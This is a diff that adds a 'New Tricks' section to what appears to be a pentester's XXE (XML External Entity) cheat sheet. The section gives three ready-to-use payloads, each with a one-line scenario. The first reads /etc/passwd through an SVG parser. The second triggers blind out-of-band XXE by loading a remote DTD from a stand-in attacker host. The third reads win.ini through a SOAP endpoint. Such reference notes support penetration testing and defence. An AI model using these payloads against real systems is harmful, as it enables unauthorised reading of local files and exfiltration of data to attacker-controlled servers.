@@ -127,3 +127,17 @@
 - **Local File Disclosure**: Always check for file-based XXE in XML parsers (file uploads, SOAP, XML-RPC).
 
 ---
+
+## New Tricks
+
+### Trick 1
+- Scenario: SVG parser resolved external entity and disclosed local file.
+- Payload: `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`
+
+### Trick 2
+- Scenario: Blind XXE triggered out-of-band DNS callback from backend parser.
+- Payload: `<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://x.attacker.tld/a.dtd">%ext;]><r/>`
+
+### Trick 3
+- Scenario: SOAP endpoint processed malicious DTD despite secure parser setting.
+- Payload: `<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><a>&xxe;</a>`
